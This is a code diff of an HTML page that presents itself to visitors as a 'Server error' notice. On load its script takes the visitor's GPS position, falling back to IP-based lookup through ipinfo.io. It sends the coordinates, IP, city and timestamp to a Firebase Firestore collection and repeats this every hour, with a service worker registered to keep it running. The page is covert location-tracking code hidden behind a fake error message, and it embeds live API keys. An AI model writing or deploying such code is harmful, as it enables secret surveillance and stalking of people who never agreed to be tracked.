@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
+    <title>Location Tracker</title>
+    
     <script type="module">
-        // Import Firebase v9+
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Firebase Configuration
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
             authDomain: "locationsaver-b9997.firebaseapp.com",
             projectId: "locationsaver-b9997",
-            storageBucket: "locationsaver-b9997.appspot.com",
+            storageBucket: "locationsaver-b9997.firebasestorage.app",
             messagingSenderId: "675975845355",
             appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
             measurementId: "G-WJJY3Q2M8E"
@@ -24,80 +24,62 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Register Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-                .then(() => console.log("✅ Service Worker Registered"))
-                .catch(err => console.error("❌ Service Worker Registration Failed", err));
+        // Get IST Time
+        function getISTTime() {
+            let now = new Date();
+            let istOffset = 5.5 * 60 * 60 * 1000; // IST is UTC+5:30
+            let istTime = new Date(now.getTime() + istOffset).toISOString();
+            return istTime;
         }
 
-        // Get Cached Location from Storage
-        async function getCachedLocation() {
-            if ('caches' in window) {
-                const cache = await caches.open('location-cache');
-                const response = await cache.match('/location.json');
-                if (response) {
-                    return response.json();
-                }
-            }
-            return null;
-        }
-
-        // Save Location in Cache
-        async function cacheLocation(locationData) {
-            if ('caches' in window) {
-                const cache = await caches.open('location-cache');
-                const response = new Response(JSON.stringify(locationData), {
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                await cache.put('/location.json', response);
+        // Save Data to Firestore
+        async function saveUserData(data) {
+            try {
+                await addDoc(collection(db, "user_data"), data);
+                console.log("✅ Data saved:", data);
+            } catch (error) {
+                console.error("❌ Error saving data:", error);
             }
         }
 
         // Get GPS Location
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            type: "GPS",
-                            timestamp: new Date().toISOString()
-                        };
-                        cacheLocation(locationData); // Cache location
-                        callback(locationData);
-                    },
-                    (error) => {
-                        console.warn("❌ GPS denied, using IP location instead.");
-                        getIPLocation(callback); // Fallback to IP location
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+                navigator.geolocation.getCurrentPosition(position => {
+                    let data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        time: getISTTime(),
+                        source: "GPS"
+                    };
+                    callback(data);
+                }, () => {
+                    console.warn("❌ GPS Denied! Using IP Location.");
+                    getIPLocation(callback);
+                });
             } else {
                 console.warn("❌ GPS not supported.");
                 getIPLocation(callback);
             }
         }
 
-        // Get IP-Based Location
+        // Get IP Location (Fallback)
         function getIPLocation(callback) {
             fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                 .then(response => response.json())
                 .then(data => {
-                    const locationData = {
+                    let location = {
                         ip: data.ip,
                         city: data.city,
                         region: data.region,
                         country: data.country,
                         latitude: data.loc.split(",")[0],
                         longitude: data.loc.split(",")[1],
-                        type: "IP",
-                        timestamp: new Date().toISOString()
+                        time: getISTTime(),
+                        source: "IP"
                     };
-                    cacheLocation(locationData); // Cache location
-                    callback(locationData);
+                    callback(location);
                 })
                 .catch(error => {
                     console.error("❌ Error fetching IP location:", error);
@@ -105,40 +87,39 @@
                 });
         }
 
-        // Save Location to Firebase
-        async function saveUserData(locationData) {
-            if (!locationData) return;
-
-            try {
-                await addDoc(collection(db, "user_locations"), locationData);
-                console.log("✅ saved:", locationData);
-            } catch (error) {
-                console.error("❌ Error saving:", error);
-            }
-        }
-
-        // Start Tracking Every 60 Minutes
+        // Periodic Tracking (Every 60 Minutes)
         function startTracking() {
-            // Check cached location first
-            getCachedLocation().then(cachedData => {
-                if (cachedData) saveUserData(cachedData);
+            getGPSLocation(location => {
+                if (location) {
+                    saveUserData(location);
+                }
             });
 
-            // Fetch and save new location
-            getGPSLocation(saveUserData);
-
-            // Track every 60 minutes
             setInterval(() => {
-                getGPSLocation(saveUserData);
-            }, 3600000);
+                getGPSLocation(location => {
+                    if (location) {
+                        saveUserData(location);
+                    }
+                });
+            }, 60 * 60 * 1000); // Every 60 minutes
         }
 
-        // Start Tracking
+        // Register Service Worker for Background Sync
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("sw.js").then(reg => {
+                console.log("✅ Service Worker Registered");
+            }).catch(error => {
+                console.error("❌ Service Worker Registration Failed:", error);
+            });
+        }
+
+        // Start Tracking When Page Loads
         startTracking();
     </script>
 </head>
+
 <body>
-    <h1>Server is busy.</h1>
-    <p>Try again after some time....</p>
+    <h1>Server error.</h1>
+    <p>Try again after some time...</p>
 </body>
 </html>
